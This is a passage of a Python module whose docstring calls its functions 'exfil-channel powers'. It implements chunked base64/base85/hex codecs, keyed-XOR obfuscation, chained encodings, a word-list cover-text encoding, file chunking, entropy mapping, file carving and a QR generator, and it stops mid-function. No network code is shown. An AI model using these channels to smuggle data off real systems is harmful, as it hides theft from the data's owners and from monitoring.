"""SSB ULTRA wave-expansion module: domain 'data' (nm20.data.*).

Data movement / exfil-channel powers: real stdlib codecs (chunked base64,
base85, hex, keyed-XOR, gzip), real chunking/manifest, real file carving,
real entropy mapping, real pure-python QR generation, real WAV-LSB stego,
real cover-text encoding, real loopback exfil simulation with timing/jitter,
plus real channel-source artifact generators. Import-safe: no side effects
at import time.
"""

import base64
import binascii
import gzip
import hashlib
import json
import math
import os
import random
import socket
import struct
import sys
import tempfile
import threading
import time
import wave

PLATFORM = sys.platform
TMPDIR = tempfile.gettempdir()


def _base(name):
    return {"ok": False, "power": "nm20.data.%s" % name, "platform": PLATFORM}


def _sha256_file(path, limit=None):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        n = 0
        while True:
            want = 65536 if limit is None else min(65536, limit - n)
            if want <= 0:
                break
            b = f.read(want)
            if not b:
                break
            h.update(b)
            n += len(b)
    return h.hexdigest()


def _write_artifact(name, src, mode=0o644):
    path = os.path.join(TMPDIR, name)
    with open(path, "w") as f:
        f.write(src)
    os.chmod(path, mode)
    return path


def _resolve_out(args, default_name):
    out = args.get("out")
    if not out:
        out = os.path.join(TMPDIR, default_name)
    return out


# --------------------------------------------------------------------------
# Real chunked stream codecs
# --------------------------------------------------------------------------

def nm20_data_b64_stream(args):
    """REAL chunked base64 encode/decode of a file (stream-safe chunk sizes)."""
    r = _base("b64_stream")
    path = args.get("path")
    mode = args.get("mode", "encode")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    chunk = int(args.get("chunk", 3 * 1024 * 1024))
    out = _resolve_out(args, os.path.basename(path) + (".b64" if mode == "encode" else ".dec"))
    n_in = n_out = 0
    try:
        with open(path, "rb") as fi, open(out, "wb") as fo:
            if mode == "encode":
                chunk -= chunk % 3  # keep 3-byte alignment so chunks concatenate cleanly
                while True:
                    b = fi.read(chunk)
                    if not b:
                        break
                    enc = base64.b64encode(b)
                    fo.write(enc)
                    n_in += len(b)
                    n_out += len(enc)
            elif mode == "decode":
                raw = fi.read()
                raw = b"".join(raw.split())  # tolerate whitespace-wrapped b64
                n_in = len(raw)
                step = 4 * 1024 * 1024
                for i in range(0, len(raw), step):
                    seg = raw[i:i + step]
                    try:
                        dec = base64.b64decode(seg, validate=True)
                    except binascii.Error as e:
                        r["error"] = "b64 decode at offset %d: %s" % (i, e)
                        fo.close()
                        os.unlink(out)
                        return r
                    fo.write(dec)
                    n_out += len(dec)
            else:
                r["error"] = "mode must be encode|decode"
                return r
        r["ok"] = True
        r["mode"] = mode
        r["input"] = path
        r["output"] = out
        r["bytes_in"] = n_in
        r["bytes_out"] = n_out
        r["output_sha256"] = _sha256_file(out)
        if mode == "encode" and n_in:
            r["expansion"] = round(n_out / float(n_in), 4)
    except OSError as e:
        r["error"] = str(e)
    return r


def nm20_data_b85_stream(args):
    """REAL chunked base85 (RFC1924 alphabet) encode/decode of a file."""
    r = _base("b85_stream")
    path = args.get("path")
    mode = args.get("mode", "encode")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    out = _resolve_out(args, os.path.basename(path) + (".b85" if mode == "encode" else ".dec"))
    n_in = n_out = 0
    try:
        with open(path, "rb") as fi, open(out, "wb") as fo:
            if mode == "encode":
                chunk = int(args.get("chunk", 4 * 1024 * 1024))
                chunk -= chunk % 4  # 4-byte groups -> 5 chars; aligned chunks concatenate
                while True:
                    b = fi.read(chunk)
                    if not b:
                        break
                    enc = base64.b85encode(b)
                    fo.write(enc)
                    n_in += len(b)
                    n_out += len(enc)
            elif mode == "decode":
                raw = b"".join(fi.read().split())
                n_in = len(raw)
                step = 5 * 1024 * 1024
                for i in range(0, len(raw), step):
                    seg = raw[i:i + step]
                    try:
                        dec = base64.b85decode(seg)
                    except (ValueError, binascii.Error) as e:
                        r["error"] = "b85 decode at offset %d: %s" % (i, e)
                        fo.close()
                        os.unlink(out)
                        return r
                    fo.write(dec)
                    n_out += len(dec)
            else:
                r["error"] = "mode must be encode|decode"
                return r
        r["ok"] = True
        r["mode"] = mode
        r["input"] = path
        r["output"] = out
        r["bytes_in"] = n_in
        r["bytes_out"] = n_out
        r["output_sha256"] = _sha256_file(out)
        if mode == "encode" and n_in:
            r["expansion"] = round(n_out / float(n_in), 4)  # ~1.25 vs b64's 1.333
    except OSError as e:
        r["error"] = str(e)
    return r


def nm20_data_hex_stream(args):
    """REAL chunked hex encode/decode of a file (2x expansion channel)."""
    r = _base("hex_stream")
    path = args.get("path")
    mode = args.get("mode", "encode")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    out = _resolve_out(args, os.path.basename(path) + (".hex" if mode == "encode" else ".dec"))
    n_in = n_out = 0
    try:
        with open(path, "rb") as fi, open(out, "wb") as fo:
            if mode == "encode":
                while True:
                    b = fi.read(2 * 1024 * 1024)
                    if not b:
                        break
                    enc = binascii.hexlify(b)
                    fo.write(enc)
                    n_in += len(b)
                    n_out += len(enc)
            elif mode == "decode":
                raw = b"".join(fi.read().split())
                if len(raw) % 2:
                    r["error"] = "odd hex length %d" % len(raw)
                    return r
                n_in = len(raw)
                step = 4 * 1024 * 1024
                for i in range(0, len(raw), step):
                    seg = raw[i:i + step]
                    try:
                        dec = binascii.unhexlify(seg)
                    except binascii.Error as e:
                        r["error"] = "hex decode at offset %d: %s" % (i, e)
                        fo.close()
                        os.unlink(out)
                        return r
                    fo.write(dec)
                    n_out += len(dec)
            else:
                r["error"] = "mode must be encode|decode"
                return r
        r["ok"] = True
        r["mode"] = mode
        r["input"] = path
        r["output"] = out
        r["bytes_in"] = n_in
        r["bytes_out"] = n_out
        r["output_sha256"] = _sha256_file(out)
    except OSError as e:
        r["error"] = str(e)
    return r


def _xor_keystream(key, nbytes):
    """SHA256(key || counter64le) counter-mode keystream."""
    out = bytearray()
    ctr = 0
    while len(out) < nbytes:
        out += hashlib.sha256(key + struct.pack("<Q", ctr)).digest()
        ctr += 1
    return bytes(out[:nbytes])


def nm20_data_xor_stream(args):
    """REAL keyed XOR file transform (SHA256 counter-mode keystream; symmetric)."""
    r = _base("xor_stream")
    path = args.get("path")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    key_hex = args.get("key_hex")
    if key_hex:
        try:
            key = bytes.fromhex(key_hex)
        except ValueError:
            r["error"] = "key_hex is not valid hex"
            return r
    else:
        key = str(args.get("key", "nm20-default-key")).encode()
    if not key:
        r["error"] = "empty key"
        return r
    out = _resolve_out(args, os.path.basename(path) + ".xor")
    n = 0
    try:
        with open(path, "rb") as fi, open(out, "wb") as fo:
            while True:
                b = fi.read(4 * 1024 * 1024)
                if not b:
                    break
                ks = _xor_keystream(key + struct.pack("<Q", n), len(b))
                fo.write(bytes(x ^ y for x, y in zip(b, ks)))
                n += len(b)
        r["ok"] = True
        r["input"] = path
        r["output"] = out
        r["bytes"] = n
        r["key_sha256"] = hashlib.sha256(key).hexdigest()
        r["input_sha256"] = _sha256_file(path)
        r["output_sha256"] = _sha256_file(out)
        r["note"] = "symmetric: run again with same key to recover; keystream = SHA256(key|offset|ctr)"
    except OSError as e:
        r["error"] = str(e)
    return r


def nm20_data_gzip_pack(args):
    """REAL gzip pack/unpack of a file with ratio and hash reporting."""
    r = _base("gzip_pack")
    path = args.get("path")
    mode = args.get("mode", "pack")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    level = min(max(int(args.get("level", 9)), 1), 9)
    out = _resolve_out(args, os.path.basename(path) + (".gz" if mode == "pack" else ".out"))
    try:
        with open(path, "rb") as fi:
            raw = fi.read()
        if mode == "pack":
            blob = gzip.compress(raw, compresslevel=level, mtime=0)
        elif mode == "unpack":
            try:
                blob = gzip.decompress(raw)
            except (OSError, EOFError) as e:
                r["error"] = "gzip decompress: %s" % e
                return r
        else:
            r["error"] = "mode must be pack|unpack"
            return r
        with open(out, "wb") as fo:
            fo.write(blob)
        r["ok"] = True
        r["mode"] = mode
        r["input"] = path
        r["output"] = out
        r["bytes_in"] = len(raw)
        r["bytes_out"] = len(blob)
        r["ratio"] = round(len(blob) / float(len(raw)), 4) if raw else None
        r["output_sha256"] = hashlib.sha256(blob).hexdigest()
    except OSError as e:
        r["error"] = str(e)
    return r


def nm20_data_zsteg_chunks(args):
    """REAL file splitter: N numbered chunks + JSON manifest (and reassemble+verify)."""
    r = _base("zsteg_chunks")
    mode = args.get("mode", "split")
    if mode == "split":
        path = args.get("path")
        if not path or not os.path.isfile(path):
            r["error"] = "missing or unreadable arg: path"
            return r
        size = os.path.getsize(path)
        n = int(args.get("chunks", 0))
        chunk_size = int(args.get("chunk_size", 0))
        if chunk_size <= 0:
            if n <= 0:
                n = 4
            chunk_size = max(1, (size + n - 1) // n)
        outdir = args.get("outdir") or tempfile.mkdtemp(prefix="nm20_chunks_")
        os.makedirs(outdir, exist_ok=True)
        base = os.path.basename(path)
        overall = hashlib.sha256()
        parts = []
        try:
            with open(path, "rb") as f:
                idx = 0
                while True:
                    b = f.read(chunk_size)
                    if not b:
                        break
                    pname = "%s.part%03d" % (base, idx)
                    ppath = os.path.join(outdir, pname)
                    with open(ppath, "wb") as pf:
                        pf.write(b)
                    overall.update(b)
                    parts.append({"index": idx, "file": pname, "bytes": len(b),
                                  "sha256": hashlib.sha256(b).hexdigest()})
                    idx += 1
            manifest = {"source_name": base, "total_bytes": size,
                        "total_sha256": overall.hexdigest(),
                        "chunk_size": chunk_size, "parts": parts}
            mpath = os.path.join(outdir, base + ".manifest.json")
            with open(mpath, "w") as mf:
                json.dump(manifest, mf, indent=2)
            r["ok"] = True
            r["input"] = path
            r["outdir"] = outdir
            r["manifest"] = mpath
            r["part_count"] = len(parts)
            r["total_bytes"] = size
            r["total_sha256"] = manifest["total_sha256"]
        except OSError as e:
            r["error"] = str(e)
        return r
    if mode == "reassemble":
        mpath = args.get("manifest")
        if not mpath or not os.path.isfile(mpath):
            r["error"] = "missing or unreadable arg: manifest"
            return r
        try:
            with open(mpath) as mf:
                man = json.load(mf)
            outdir = os.path.dirname(os.path.abspath(mpath))
            out = _resolve_out(args, os.path.join(TMPDIR, man["source_name"] + ".reassembled"))
            overall = hashlib.sha256()
            verified = 0
            with open(out, "wb") as fo:
                for part in sorted(man["parts"], key=lambda p: p["index"]):
                    ppath = os.path.join(outdir, part["file"])
                    with open(ppath, "rb") as pf:
                        b = pf.read()
                    if hashlib.sha256(b).hexdigest() == part["sha256"]:
                        verified += 1
                    overall.update(b)
                    fo.write(b)
            r["ok"] = True
            r["output"] = out
            r["parts"] = len(man["parts"])
            r["parts_verified"] = verified
            r["total_bytes"] = os.path.getsize(out)
            r["total_sha256"] = overall.hexdigest()
            r["hash_matches_manifest"] = overall.hexdigest() == man.get("total_sha256")
        except (OSError, ValueError, KeyError) as e:
            r["error"] = str(e)
        return r
    r["error"] = "mode must be split|reassemble"
    return r


# --------------------------------------------------------------------------
# Codec chains
# --------------------------------------------------------------------------

def _chain_apply(data, ops, key, direction):
    """Apply (or reverse-apply) a comma chain of: xor,b64,b85,hex,gzip."""
    stages = []
    if direction == "decode":
        ops = list(reversed(ops))
    for op in ops:
        op = op.strip().lower()
        before = len(data)
        if op == "xor":
            ks = _xor_keystream(key, len(data))
            data = bytes(a ^ b for a, b in zip(data, ks))
        elif op == "b64":
            data = base64.b64encode(data) if direction == "encode" else base64.b64decode(b"".join(data.split()))
        elif op == "b85":
            data = base64.b85encode(data) if direction == "encode" else base64.b85decode(b"".join(data.split()))
        elif op == "hex":
            data = binascii.hexlify(data) if direction == "encode" else binascii.unhexlify(b"".join(data.split()))
        elif op == "gzip":
            data = gzip.compress(data, mtime=0) if direction == "encode" else gzip.decompress(data)
        else:
            raise ValueError("unknown op: %s (valid: xor,b64,b85,hex,gzip)" % op)
        stages.append({"op": op, "bytes_before": before, "bytes_after": len(data)})
    return data, stages


def nm20_data_encode_chain(args):
    """REAL codec chain: apply e.g. 'xor,b64,gzip' to a file; optional roundtrip verify."""
    r = _base("encode_chain")
    path = args.get("path")
    chain = args.get("chain", "xor,b64")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    key = str(args.get("key", "nm20-default-key")).encode()
    ops = [o for o in chain.split(",") if o.strip()]
    try:
        with open(path, "rb") as f:
            data = f.read()
        orig_hash = hashlib.sha256(data).hexdigest()
        out_data, stages = _chain_apply(data, ops, key, "encode")
        out = _resolve_out(args, os.path.basename(path) + ".chain")
        with open(out, "wb") as f:
            f.write(out_data)
        r["ok"] = True
        r["chain"] = ops
        r["input"] = path
        r["output"] = out
        r["input_sha256"] = orig_hash
        r["output_sha256"] = hashlib.sha256(out_data).hexdigest()
        r["stages"] = stages
        if args.get("verify"):
            back, _ = _chain_apply(out_data, ops, key, "decode")
            r["roundtrip_ok"] = hashlib.sha256(back).hexdigest() == orig_hash
    except (OSError, ValueError, binascii.Error) as e:
        r["error"] = str(e)
    return r


def nm20_data_decode_chain(args):
    """REAL inverse codec chain: undo an encode_chain output (ops reversed)."""
    r = _base("decode_chain")
    path = args.get("path")
    chain = args.get("chain", "xor,b64")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    key = str(args.get("key", "nm20-default-key")).encode()
    ops = [o for o in chain.split(",") if o.strip()]
    try:
        with open(path, "rb") as f:
            data = f.read()
        out_data, stages = _chain_apply(data, ops, key, "decode")
        out = _resolve_out(args, os.path.basename(path) + ".unchain")
        with open(out, "wb") as f:
            f.write(out_data)
        r["ok"] = True
        r["chain_applied"] = [s["op"] for s in stages]
        r["input"] = path
        r["output"] = out
        r["output_sha256"] = hashlib.sha256(out_data).hexdigest()
        r["bytes_out"] = len(out_data)
        r["stages"] = stages
        expect = args.get("expect_sha256")
        if expect:
            r["matches_expected"] = hashlib.sha256(out_data).hexdigest() == expect
    except (OSError, ValueError, binascii.Error) as e:
        r["error"] = str(e)
    return r


# --------------------------------------------------------------------------
# Cover-text channel (256-word byte substitution alphabet)
# --------------------------------------------------------------------------

_COVER_WORDS = (
    "amber apple arch arrow aspen atlas autumn basil "
    "beacon birch blade bloom brave breeze brick bridge "
    "brook cedar charm cinder cliff cloud clover coast "
    "cobalt comet copper coral crane creek crest crystal "
    "cypress dawn delta drift dune dusk eagle ember "
    "fable falcon fern field flint forest fox frost "
    "garnet gate glacier glen grove harbor hazel hearth "
    "heron hollow holly horizon hunter iris island ivory "
    "jade jasper juniper kelp lagoon laurel leaf lilac "
    "lily linden lodestar lotus lumen maple marble marsh "
    "meadow mercury mesa mist mocha moss north oak "
    "oasis ocean olive onyx opal orchard otter pearl "
    "pebble pepper pine plume polar poppy prism quartz "
    "quill rain raven reed ridge river robin rowan "
    "sage salmon sand sapphire scarlet shadow shell shore "
    "sierra silk silver slate smoke solar south sparrow "
    "spring spruce star stone storm summit sunset swift "
    "talon thorn timber topaz trail tulip tundra twilight "
    "vale velvet violet vista walnut wave west willow "
    "winter wren zephyr acorn alley anchor anvil apricot "
    "arena aspen2 aurora badge bamboo banner barrel basket "
    "bayou beetle berry blanket bonnet border boulder bounty "
    "bramble brine brook2 bundle burrow butte cabin cactus "
    "candle canoe canvas canyon carrot cascade castle cellar "
    "chapel charter chestnut cinder2 circus citadel clementine cobble "
    "compass copper2 cottage cougar cove coyote crater cricket "
    "crystal2 currant daisy dagger danube desert diamond dolphin "
    "domino dragon dune2 eagle2 east eclipse elm ember2 "
    "emerald falcon2 fawn feather fiddle fjord flame fleece "
    "flora forge fountain fox2 galaxy garden garnet2 gem "
    "gecko ginger glade gold goose granite harbor2 hawk "
    "hemlock highland honey iceberg indigo inlet iron ivy "
).split()
assert len(_COVER_WORDS) == 256 and len(set(_COVER_WORDS)) == 256
_COVER_INDEX = {w: i for i, w in enumerate(_COVER_WORDS)}


def nm20_data_cover_text_gen(args):
    """REAL bytes<->word-list cover text (256 builtin words, 1 word per byte)."""
    r = _base("cover_text_gen")
    mode = args.get("mode", "encode")
    r["alphabet_words"] = 256
    if mode == "encode":
        path = args.get("path")
        text = args.get("text")
        if path and os.path.isfile(path):
            with open(path, "rb") as f:
                data = f.read()
            src = path
        elif text is not None:
            data = text.encode("utf-8")
            src = "<inline text>"
        else:
            r["error"] = "provide path= or text="
            return r
        limit = int(args.get("max_bytes", 4096))
        if len(data) > limit:
            r["error"] = "input %d bytes exceeds max_bytes=%d" % (len(data), limit)
            return r
        words = [_COVER_WORDS[b] for b in data]
        body = " ".join(words)
        out = _resolve_out(args, "nm20_cover_text.txt")
        with open(out, "w") as f:
            f.write(body + "\n")
        r["ok"] = True
        r["source"] = src
        r["output"] = out
        r["bytes_encoded"] = len(data)
        r["word_count"] = len(words)
        r["sample"] = " ".join(words[:16])
        r["output_sha256"] = _sha256_file(out)
    elif mode == "decode":
        path = args.get("path")
        text = args.get("text")
        if path and os.path.isfile(path):
            with open(path) as f:
                text = f.read()
        if text is None:
            r["error"] = "provide path= or text="
            return r
        toks = text.split()
        buf = bytearray()
        bad = []
        for t in toks:
            w = t.strip(".,;:!?").lower()
            if w in _COVER_INDEX:
                buf.append(_COVER_INDEX[w])
            elif len(bad) < 10:
                bad.append(t)
        if bad:
            r["ok"] = False
            r["error"] = "unknown cover words (sample): %s" % bad
            return r
        data = bytes(buf)
        out = _resolve_out(args, "nm20_cover_decoded.bin")
        with open(out, "wb") as f:
            f.write(data)
        r["ok"] = True
        r["output"] = out
        r["bytes_decoded"] = len(data)
        r["sha256"] = hashlib.sha256(data).hexdigest()
        r["preview_utf8"] = data[:64].decode("utf-8", "replace")
    else:
        r["error"] = "mode must be encode|decode"
    return r


# --------------------------------------------------------------------------
# Entropy mapping + carving
# --------------------------------------------------------------------------

def _shannon(block):
    if not block:
        return 0.0
    counts = [0] * 256
    for b in block:
        counts[b] += 1
    n = len(block)
    ent = 0.0
    for c in counts:
        if c:
            p = c / float(n)
            ent -= p * math.log2(p)
    return ent


def nm20_data_entropy_scan(args):
    """REAL per-block Shannon entropy map of a file with classification flags."""
    r = _base("entropy_scan")
    path = args.get("path")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    block_size = max(256, int(args.get("block", 4096)))
    hi = float(args.get("high", 7.2))
    lo = float(args.get("low", 1.0))
    spark = " .:-=+*#%@"
    blocks = []
    total = 0.0
    nblk = 0
    max_map = int(args.get("max_map", 512))
    try:
        with open(path, "rb") as f:
            off = 0
            sparkline = []
            while True:
                b = f.read(block_size)
                if not b:
                    break
                e = _shannon(b)
                total += e
                nblk += 1
                if len(blocks) < max_map:
                    cls = "high(random/encrypted?)" if e >= hi else ("low(structured/zeros)" if e <= lo else "mid")
                    blocks.append({"offset": off, "bytes": len(b),
                                   "entropy": round(e, 4), "class": cls})
                sparkline.append(spark[min(9, int(e / 8.0 * 10))])
                off += len(b)
        r["ok"] = True
        r["path"] = path
        r["block_size"] = block_size
        r["blocks"] = nblk
        r["mean_entropy"] = round(total / nblk, 4) if nblk else 0.0
        r["max_entropy"] = max((b["entropy"] for b in blocks), default=0.0)
        r["high_entropy_blocks"] = sum(1 for b in blocks if b["entropy"] >= hi)
        r["map"] = blocks
        r["map_truncated"] = nblk > max_map
        r["sparkline"] = "".join(sparkline[:256])
    except OSError as e:
        r["error"] = str(e)
    return r


_CARVE_SIGS = [
    {"name": "png", "magic": bytes.fromhex("89504e470d0a1a0a"),
     "footer": bytes.fromhex("49454e44ae426082"), "foot_pad": 0, "ext": ".png"},
    {"name": "jpeg", "magic": b"\xff\xd8\xff",
     "footer": b"\xff\xd9", "foot_pad": 0, "ext": ".jpg"},
    {"name": "gif", "magic": b"GIF8",
     "footer": b"\x00\x3b", "foot_pad": 0, "ext": ".gif"},
    {"name": "pdf", "magic": b"%PDF",
     "footer": b"%%EOF", "foot_pad": 0, "ext": ".pdf"},
    {"name": "zip", "magic": b"PK\x03\x04",
     "footer": b"PK\x05\x06", "foot_pad": 22, "ext": ".zip"},
    {"name": "gzip", "magic": b"\x1f\x8b", "footer": None, "ext": ".gz"},
    {"name": "elf", "magic": b"\x7fELF", "footer": None, "ext": ".elf"},
    {"name": "rar", "magic": b"Rar!\x1a\x07", "footer": None, "ext": ".rar"},
    {"name": "7z", "magic": bytes.fromhex("377abcaf271c"), "footer": None, "ext": ".7z"},
    {"name": "sqlite", "magic": b"SQLite format 3\x00", "footer": None, "ext": ".sqlite"},
    {"name": "bmp", "magic": b"BM", "footer": None, "ext": ".bmp", "size_at": 2},
    {"name": "wav", "magic": b"RIFF", "footer": None, "ext": ".wav",
     "size_at": 4, "size_add": 8, "verify": b"WAVE"},
]


def nm20_data_file_carve(args):
    """REAL magic-byte carver: extracts embedded files from a blob into /tmp."""
    r = _base("file_carve")
    path = args.get("path")
    if not path or not os.path.isfile(path):
        r["error"] = "missing or unreadable arg: path"
        return r
    max_size = int(args.get("max_size", 4 * 1024 * 1024))
    max_hits = int(args.get("max_hits", 64))
    outdir = args.get("outdir") or tempfile.mkdtemp(prefix="nm20_carve_")
    os.makedirs(outdir, exist_ok=True)
    try:
        with open(path, "rb") as f:
            blob = f.read()
    except OSError as e:
        r["error"] = str(e)
        return r
    hits = []
    for sig in _CARVE_SIGS:
        start = 0
        magic = sig["magic"]
        while len(hits) < max_hits:
            i = blob.find(magic, start)
            if i < 0:
                break
            start = i + 1
            if sig.get("verify") and blob[i + 8:i + 12] != sig["verify"]:
                continue
            end = None
            if "size_at" in sig and i + sig["size_at"] + 4 <= len(blob):
                sz = struct.unpack("<I", blob[i + sig["size_at"]:i + sig["size_at"] + 4])[0]
                end = min(len(blob), i + sz + sig.get("size_add", 0))
            elif sig["footer"]:
                j = blob.find(sig["footer"], i + len(magic))
                if j >= 0:
                    end = j + len(sig["footer"]) + sig.get("foot_pad", 0)
            if end is None:
                end = min(len(blob), i + max_size)
            if end - i < len(magic):
                continue
            name = "carved_%08x%s" % (i, sig["ext"])
            opath = os.path.join(outdir, name)
            try:
                with open(opath, "wb") as of:
                    of.write(blob[i:end])
            except OSError:
                continue
            hits.append({"type": sig["name"], "offset": i,
                         "bytes": end - i, "out": opath,
                         "sha256": hashlib.sha256(blob[i:end]).hexdigest(),
                         "boundary": ("embedded-size" if "size_at" in sig
                                      else ("footer" if (sig["footer"] and end != min(len(blob), i + max_size))
                                            else "max_size-cap"))})
    r["ok"] = True
    r["blob"] = path
    r["blob_bytes"] = len(blob)
    r["blob_sha256"] = hashlib.sha256(blob).hexdigest()
    r["outdir"] = outdir
    r["carved"] = len(hits)
    r["hits"] = hits
    return r


# --------------------------------------------------------------------------
# Minimal pure-python QR generator (byte mode, EC level L, versions 1-9)
# --------------------------------------------------------------------------

_QR_TOTAL_CW = [26, 44, 70, 100, 134, 172, 196, 242, 292]           # v1..v9
_QR_ECC_PER_BLOCK_L = [7, 10, 15, 20, 26, 18, 20, 24, 30]           # level L
_QR_NUM_BLOCKS_L = [1, 1, 1, 1, 1, 2, 2, 2, 2]                      # level L
_QR_ALIGN = [[], [6, 18], [6, 22], [6, 26], [6, 30], [6, 34],
             [6, 22, 38], [6, 24, 42], [6, 26, 46]]                 # v1..v9


def _qr_gf_tables():
    exp = [0] * 512
    log = [0] * 256
    x = 1
    for i in range(255):
        exp[i] = x
        log[x] = i
        x <<= 1
        if x & 0x100:
            x ^= 0x11D
    for i in range(255, 512):
        exp[i] = exp[i - 255]
    return exp, log


def _qr_rs_remainder(data, degree, exp, log):
    def mul(a, b):
        return 0 if a == 0 or b == 0 else exp[log[a] + log[b]]
    div = [0] * (degree - 1) + [1]
    root = 1
    for _ in range(degree):
        for j in range(degree):
            div[j] = mul(div[j], root)
            if j + 1 < degree:
                div[j] ^= div[j + 1]
        root = mul(root, 2)
    res = [0] * degree
    for b in data:
        factor = b ^ res.pop(0)
        res.append(0)
        for i, c in enumerate(div):
            res[i] ^= mul(c, factor)
    return res


def _qr_mask_bit(mask, x, y):
    if mask == 0:
        return (x + y) % 2 == 0
    if mask == 1:
        return y % 2 == 0
    if mask == 2:
        return x % 3 == 0
    if mask == 3:
        return (x + y) % 3 == 0
    if mask == 4:
        return (x // 3 + y // 2) % 2 == 0
    if mask == 5:
        return (x * y) % 2 + (x * y) % 3 == 0
    if mask == 6:
        return ((x * y) % 2 + (x * y) % 3) % 2 == 0
    return ((x + y) % 2 + (x * y) % 3) % 2 == 0  # mask 7


def _qr_penalty(mod, size):
    pen = 0
    # N1: runs of >=5 same color in rows and columns
    for row in range(size):
        run_color = mod[row][0]
        run_len = 1
        for x in range(1, size):
            if mod[row][x] == run_color:
                run_len += 1
            else:
                if run_len >= 5:
                    pen += 3 + (run_len - 5)
                run_color = mod[row][x]
                run_len = 1
        if run_len >= 5:
            pen += 3 + (run_len - 5)
    for x in range(size):
        run_color = mod[0][x]
        run_len = 1
        for y in range(1, size):
            if mod[y][x] == run_color:
                run_len += 1
            else:
                if run_len >= 5:
                    pen += 3 + (run_len - 5)
                run_color = mod[y][x]
                run_len = 1
        if run_len >= 5:
            pen += 3 + (run_len - 5)
    # N2: 2x2 blocks of same color
    for y in range(size - 1):
        for x in range(size - 1):
            c = mod[y][x]
            if mod[y][x + 1] == c and mod[y + 1][x] == c and mod[y + 1][x + 1] == c:
                pen += 3
    # N3: finder-like 1:1:3:1:1 pattern with 4 light on one side
    pat1 = [True, False, True, True, True, False, True, False, False, False, False]
    pat2 = [False, False, False, False, True, False, True, True, True, False, True]
    for y in range(size):
        for x in range(size - 10):
            w = [mod[y][x + k] for k in range(11)]
            if w == pat1 or w == pat2:
                pen += 40
    for x in range(size):
        for y in range(size - 10):
            w = [mod[y + k][x] for k in range(11)]
            if w == pat1 or w == pat2:
                pen += 40
    # N4: dark proportion
    dark = sum(1 for y in range(size) for x in range(size) if mod[y][x])
    total = size * size
    k = abs(dark * 20 - total * 10) // total
    pen += k * 10
    return pen


def _qr_build_matrix(data):
    """Return (version, size, modules, mask, penalty) or raise ValueError."""
    version = None
    for v in range(1, 10):
        data_cw = _QR_TOTAL_CW[v - 1] - _QR_ECC_PER_BLOCK_L[v - 1] * _QR_NUM_BLOCKS_L[v - 1]
        if 4 + 8 + len(data) * 8 <= data_cw * 8:
            version = v
            break
    if version is None:
        raise ValueError("payload too large for v9-L (230 bytes max)")
    data_cw = _QR_TOTAL_CW[version - 1] - _QR_ECC_PER_BLOCK_L[version - 1] * _QR_NUM_BLOCKS_L[version - 1]
    cap_bits = data_cw * 8
    bb = []

    def put(val, nbits):
        for i in range(nbits - 1, -1, -1):
            bb.append((val >> i) & 1)

    put(0x4, 4)            # byte mode indicator
    put(len(data), 8)      # 8-bit length (versions 1-9)
    for b in data:
        put(b, 8)
    put(0, min(4, cap_bits - len(bb)))  # terminator
    while len(bb) % 8:
        bb.append(0)
    i = 0
    while len(bb) < cap_bits:
        put((0xEC, 0x11)[i % 2], 8)
        i += 1
    codewords = [0] * data_cw
    for i in range(data_cw):
        for j in range(8):
            codewords[i] = (codewords[i] << 1) | bb[i * 8 + j]

    exp, log = _qr_gf_tables()
    ecc_len = _QR_ECC_PER_BLOCK_L[version - 1]
    nblocks = _QR_NUM_BLOCKS_L[version - 1]
    blk_len = data_cw // nblocks
    blocks = []
    eccs = []
    k = 0
    for _ in range(nblocks):
        blk = codewords[k:k + blk_len]
        k += blk_len
        blocks.append(blk)
        eccs.append(_qr_rs_remainder(blk, ecc_len, exp, log))
    allcw = []
    for i in range(blk_len):
        for b in blocks:
            allcw.append(b[i])
    for i in range(ecc_len):
        for e in eccs:
            allcw.append(e[i])

    size = version * 4 + 17
    modules = [[False] * size for _ in range(size)]
    isfunc = [[False] * size for _ in range(size)]

    def setf(x, y, dark):
        modules[y][x] = bool(dark)
        isfunc[y][x] = True

    def draw_finder(cx, cy):
        for dy in range(-1, 8):
            for dx in range(-1, 8):
                x, y = cx + dx, cy + dy
                if 0 <= x < size and 0 <= y < size:
                    dark = (0 <= dx <= 6 and 0 <= dy <= 6 and
                            (dx in (0, 6) or dy in (0, 6) or (2 <= dx <= 4 and 2 <= dy <= 4)))
                    setf(x, y, dark)

    draw_finder(0, 0)
    draw_finder(size - 7, 0)
    draw_finder(0, size - 7)
    # timing patterns
    for i in range(8, size - 8):
        setf(6, i, i % 2 == 0)
        setf(i, 6, i % 2 == 0)
    # alignment patterns (skip the three finder corners)
    pos = _QR_ALIGN[version - 1]
    np_ = len(pos)
    for ix, px in enumerate(pos):
        for iy, py in enumerate(pos):
            if (ix == 0 and iy == 0) or (ix == np_ - 1 and iy == 0) or (ix == 0 and iy == np_ - 1):
                continue
            for dy in range(-2, 3):
                for dx in range(-2, 3):
                    setf(px + dx, py + dy, max(abs(dx), abs(dy)) != 1)

    def draw_format(mask):
        fd = (1 << 3) | mask        # EC level L = 01
        rem = fd
        for _ in range(10):
            rem = (rem << 1) ^ ((rem >> 9) * 0x537)
        bits = ((fd << 10) | rem) ^ 0x5412
        for i in range(6):
            setf(8, i, (bits >> i) & 1)
        setf(8, 7, (bits >> 6) & 1)
        setf(8, 8, (bits >> 7) & 1)
        setf(7, 8, (bits >> 8) & 1)
        for i in range(9, 15):
            setf(14 - i, 8, (bits >> i) & 1)
        for i in range(8):
            setf(size - 1 - i, 8, (bits >> i) & 1)
        for i in range(8, 15):
            setf(8, size - 15 + i, (bits >> i) & 1)
        setf(8, size - 8, True)     # dark module

    draw_format(0)  # reserve format modules (real values drawn after masking)

    # version information (mandatory for versions >= 7): two 6x3 BCH blocks
    if version >= 7:
        rem = version
        for _ in range(12):
            rem = (rem << 1) ^ ((rem >> 11) * 0x1F25)
        vbits = (version << 12) | rem
        for i in range(18):
            bit = (vbits >> i) & 1
            a = size - 11 + i % 3
            b = i // 3
            setf(a, b, bit)
            setf(b, a, bit)

    # zigzag data placement
    bits = []
    for b in allcw:
